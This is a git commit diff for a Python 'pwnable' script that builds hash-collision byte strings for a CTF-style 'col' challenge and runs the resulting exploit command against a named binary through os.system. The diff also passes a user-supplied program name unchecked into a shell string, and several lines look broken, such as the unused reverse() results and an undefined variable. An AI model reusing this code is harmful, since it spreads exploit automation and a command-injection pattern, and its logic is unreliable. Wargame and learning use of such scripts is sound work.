4b119ab5ae822327ea0413dee9f34f5118623a68
naivenom <naivenom@protonmail.com>
2017-12-06 12:41:22 +0100

    Update hash-collision-attack.py

--- hash-collision-attack.py
+++ hash-collision-attack.py
@@ -1,6 +1,6 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 ###############################################################
-## [Name]: hash-collision-attack.py -- a pwnable script
+## [Name]: hash-collision-attack.py -- a pwnable script purpose
 ## [Author]: Naivenom www.fwhibbit.es
 ##-------------------------------------------------------------
 ## [Details]:
@@ -8,10 +8,11 @@
 ## Because hash functions have infinite input length and a predefined output length, there is inevitably going to be the possibility of two different inputs that produce the same output hash.
 ## If two separate inputs produce the same hash output, it is called a collision. This collision can then be exploited by any application that compares two hashes together – such as password hashes, file integrity checks, etc.
 ##------------------------------------------------------------
-## [Usage]:
-## python3 hash-collision-attack.py --hashcode 0x21DD09EC --chunkbytes 5
+## [Usage]: Example
+## python3 hash-collision-attack.py --hashcode 0x21DD09EC --chunkbytes 5 --vulnapp col
 ###############################################################
 
+import os
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -21,18 +22,26 @@ parser.add_argument('--hashcode', action='store', dest='hashcode',
 parser.add_argument('--chunkbytes', action='store', dest='chunkbytes',
 					help='We need to know how many iteration has the password hash function to use chunks bytes. So number of chunk bytes (integer value 4 bytes)')
 
+parser.add_argument('--vulnapp', action='store', dest='vulnapp',
+					help='Bash vulnapp execute')
+
 parser.add_argument('--version', action='version', version='%(prog)s 0.1')
 
 results = parser.parse_args()
 print('[+]Hashcode:', results.hashcode)
 print ('[+]Number of chunk bytes:', results.chunkbytes)
+print ('[+]Vulnapp:', results.vulnapp)
 
 c = 0
-x = "x"
+x = "\\x"
+X= "x"
 array1 = []
 array2 = []
+reverse_array1= []
+reverse_array2= []
 hashcode = results.hashcode
 chunkbytes = results.chunkbytes
+vulnapp = results.vulnapp
 
 divide = int(hashcode, 16)/int(chunkbytes)
 
@@ -47,16 +56,23 @@ if type(divide) == float:
 	lenHex2Withoutx = int(len(hex2Withoutx))
 	if lenHex1Withoutx%2 == 0 and lenHex2Withoutx%2 == 0:
 		for i in range(int(len(hex1Withoutx))//2):
-			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
+			array1.append(str(X)+hex1WithoutxPlus0[c:2+c])
 			c = c+2
 		c = 0
 		for i in range(int(len(hex2Withoutx))//2):
-			array2.append(str(x)+hex2WithoutxPlus0[c:2+c])
+			array2.append(str(X)+hex2WithoutxPlus0[c:2+c])
 			c = c+2
-		print('[+] RESULTS:')
-		print('\t','[+] Chunks Little Endian Bytes', '*',int(chunkbytes)-1,array1)
-		print('\t','[+] Chunks Little Endian Byte',array2)
-		print('\t','[+] Example of Explotation: $ ./appVuln $(python -c "print(array1*4+array2)")')
+		print('[+] EXPLOTATION:')
+		reverse_array1 = array1.reverse()
+		reverse_array2 = array2.reverse()
+		stri1 = ''.join(array1)
+		exploit1 = "'"+stri1+"'"
+		print('\t',exploit1)
+		stri2 = ''.join(array2)
+		exploit2 = "'"+stri2+"'"
+		print('\t',exploit2)
+		print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
+		os.system('./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
 	else:
 		hex1WithoutxPlus0 = "0"+hex1Withoutx
 		hex2WithoutxPlus0 = "0"+hex2Withoutx
@@ -64,30 +80,47 @@ if type(divide) == float:
 			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
 			c = c+2
 			#06c5cec8
+			#'\x06\xc5\xce\xc8'
 		c = 0
 		for i in range(int(len(hex2WithoutxPlus0))//2):
 			array2.append(str(x)+hex2WithoutxPlus0[c:2+c])
 			c = c+2
-		print('[+] RESULTS:')
-		print('\t','[+] Chunks Little Endian Bytes', '*',int(chunkbytes)-1,array1)
-		print('\t','[+] Chunks Little Endian Byte',array2)
-		print('\t','[+] Example of Explotation: $ ./appVuln $(python -c "print(array1*4+array2)")')
+		print('[+] EXPLOTATION:')
+		reverse_array1 = array1.reverse()
+		reverse_array2 = array2.reverse()
+		stri1 = ''.join(array1)
+		exploit1 = "'"+stri1+"'"
+		print('\t',exploit1)
+		stri2 = ''.join(array2)
+		exploit2 = "'"+stri2+"'"
+		print('\t',exploit2)
+		print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
+		os.system('./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
+
 else: #integer and round value, not float
 	hex1 = hex(divide)
 	hex1Withoutx = hex1.rsplit('x', 1)[1]
 	lenHex1Withoutx = int(len(hex1Withoutx))
 	if lenHex1Withoutx%2 == 0 and lenHex2Withoutx%2 == 0:
 		for i in range(int(len(hex1Withoutx))//2):
-			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
+			array1.append(str(X)+hex1WithoutxPlus0[c:2+c])
 			c = c+2
-		print('[+] RESULTS:')
-		print('\t','[+] Chunks Little Endian Bytes', '*',int(chunkbytes),array1)
-		print('\t','[+] Example of Explotation: $ ./appVuln $(python -c "print(array1*5)")')
+		print('[+] EXPLOTATION:')
+		reverse_array1 = array1.reverse()
+		stri1 = ''.join(array1)
+		exploit1 = "'"+stri1+"'"
+		print('\t',exploit1)
+		print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
+		os.system('./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
 	else:
 		hex1WithoutxPlus0 = "0"+hex1Withoutx
 		for i in range(int(len(hex1WithoutxPlus0))//2):
-			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
+			array1.append(str(X)+hex1WithoutxPlus0[c:2+c])
 			c = c+2
-		print('[+] RESULTS:')
-		print('\t','[+] Chunks Little Endian Bytes', '*',int(chunkbytes),array1)
-		print('\t','[+] Example of Explotation: $ ./appVuln $(python -c "print(array1*5)")')
+		print('[+] EXPLOTATION:')
+		reverse_array1 = array1.reverse()
+		stri1 = ''.join(array1)
+		exploit1 = "'"+stri1+"'"
+		print('\t',exploit1)
+		print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
+		os.system('./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
